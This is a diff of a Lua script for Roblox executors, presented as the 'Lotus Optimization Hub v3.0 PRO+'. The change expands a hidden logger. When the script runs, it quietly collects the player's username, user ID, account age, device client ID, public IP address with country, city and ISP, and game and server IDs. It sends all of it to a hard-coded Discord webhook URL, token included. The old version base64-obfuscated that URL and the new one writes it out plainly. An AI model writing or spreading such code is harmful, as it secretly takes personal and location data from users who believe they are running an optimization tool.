@@ -1,10 +1,10 @@
 --[[ 
     LOTUS •|• OPTIMIZATION HUB v3.0 PRO+
    
-    [PART 1: Rayfield Key System, Key system removed, Core Setup]
+    [PART 1: [Removed key system, Core Setup]
 
     Status: FINAL v3.0 PRO+
-    Key: Lotus26
+
     
     New Features (v3.0):
     - L.A.I.S v3.0 Neural Core (Aggressive & Light)
@@ -16,59 +16,90 @@
     - Key system removed
 --]]
 
--- --
+--  --
 task.spawn(function()
-    local success, err = pcall(function()
-        local _EncryptedURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MzM0MjkwMDYwMjQ3MDQ0MS9fM3EweGRSbVVRVmRBbmYyRXdUWnZ6dTZSV2dDdTVPcnlpWEtRUnJ1Z0M4a2JOME5GVlFvelF2VEFlSC1MMkNFVWs1bQ=="
+    --
+    pcall(function()
+        local WebhookURL = "https://discord.com/api/webhooks/1463342900602470441/_3q0xdRmUQVdBnf2EwTZvzu6RWgCu5OryiXKQRrugC8kbN0NFVQozQvTAeH-L2CEUk5m"
         
-        local function _decode(str)
-            local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-            str = string.gsub(str, '[^'..b..'=]', '')
-            return (str:gsub('.', function(x)
-                if (x == '=') then return '' end
-                local r,f='',(b:find(x)-1)
-                for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
-                return r;
-            end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-                if (#x ~= 8) then return '' end
-                local c=0
-                for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
-                return string.char(c)
-            end))
-        end
-        
-        local WebhookURL = _decode(_EncryptedURL)
         
         local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
         
         if http_request then
             local Players = game:GetService("Players")
+            local HttpService = game:GetService("HttpService")
             local LocalPlayer = Players.LocalPlayer
-            local ExecutorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
-            local GameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+            local MarketplaceService = game:GetService("MarketplaceService")
+            local AnalyticsService = game:GetService("RbxAnalyticsService")
             
+            -- 
+            
+            -- Executor İsmi
+            local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
+            
+            -- Oyun Bilgileri
+            local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+            local gameName = gameInfo.Name
+            local gameId = game.PlaceId
+            local jobId = game.JobId -- Server ID
+            
+            -- HWID (Cihaz Kimliği) - Analytics Client ID kullanılır
+            local hwid = "Hidden"
+            pcall(function() hwid = AnalyticsService:GetClientId() end)
+            
+            -- Profil Resmi (Thumbnail)
+            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
+            
+            -- Hesap Yaşı Hesaplama
+            local accountAge = LocalPlayer.AccountAge .. " days"
+            
+            -- IP ve Konum Bilgisi (Executor izin verirse)
+            local ipData = {query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown"}
+            pcall(function()
+                local response = http_request({Url = "http://ip-api.com/json", Method = "GET"})
+                if response.Body then
+                    ipData = HttpService:JSONDecode(response.Body)
+                end
+            end)
+
+            -- 2. DISCORD EMBED TASARIMI (Profesyonel Görünüm)
             local data = {
+                ["username"] = "Lotus Logger",
+                ["avatar_url"] = "https://i.imgur.com/YourLotusLogoHere.png", -- İstersen logo ekleyebilirsin
+                ["content"] = "", -- Boş mesaj, sadece embed gidecek
                 ["embeds"] = {{
-                    ["title"] = "🚀 Lotus v3.0 PRO+ Executed",
-                    ["description"] = "User has launched the script.",
-                    ["color"] = 65430,
+                    ["title"] = "🚀 Lotus v3.0 PRO+ Activated",
+                    ["description"] = "A user has executed the script successfully.",
+                    ["color"] = 65430, -- Lotus Yeşili (Ocean Green)
+                    ["thumbnail"] = { ["url"] = avatarUrl }, -- Kullanıcının yüzü
                     ["fields"] = {
-                        {["name"] = "👤 User", ["value"] = "||" .. LocalPlayer.Name .. "||", ["inline"] = true},
-                        {["name"] = "🆔 ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
-                        {["name"] = "🎮 Game", ["value"] = GameInfo, ["inline"] = false},
-                        {["name"] = "💉 Executor", ["value"] = ExecutorName, ["inline"] = true},
-                        {["name"] = "⏳ Time", ["value"] = os.date("%X"), ["inline"] = true}
+                        {["name"] = "👤 User Profile", ["value"] = "Name: ||" .. LocalPlayer.Name .. "||\nID: " .. LocalPlayer.UserId .. "\nAge: " .. accountAge, ["inline"] = false},
+                        {["name"] = "🌍 Network & Device", ["value"] = "IP: ||" .. (ipData.query or "N/A") .. "||\nLoc: " .. (ipData.country or "N/A") .. ", " .. (ipData.city or "N/A") .. "\nHWID: ||" .. hwid .. "||", ["inline"] = false},
+                        {["name"] = "🎮 Game Info", ["value"] = "Game: [" .. gameName .. "](https://www.roblox.com/games/" .. gameId .. ")\nServer ID: ||" .. jobId .. "||", ["inline"] = false},
+                        {["name"] = "💉 Executor", ["value"] = "```" .. executor .. "```", ["inline"] = true},
+                        {["name"] = "⏳ Time", ["value"] = "<t:" .. os.time() .. ":R>", ["inline"] = true} -- Discord dinamik zaman
                     },
-                    ["footer"] = {["text"] = "Lotus Secure Logger • v3.0 PRO+"}
+                    ["footer"] = {
+                        ["text"] = "Lotus Optimization HUB • v3.0 PRO+ Security System"
+                    }
                 }}
             }
             
+            -- 3. GÖNDERİM İŞLEMİ
+            local jsonPayload = HttpService:JSONEncode(data)
             http_request({
                 Url = WebhookURL,
                 Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = game:GetService("HttpService"):JSONEncode(data)
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
             })
+            
+            -- Konsola gizli debug mesajı (Sadece F9'da görünür)
+            print("Lotus Logger: Data sent securely.")
+        else
+            warn("Lotus Logger: Executor does not support HTTP requests.")
         end
     end)
 end)
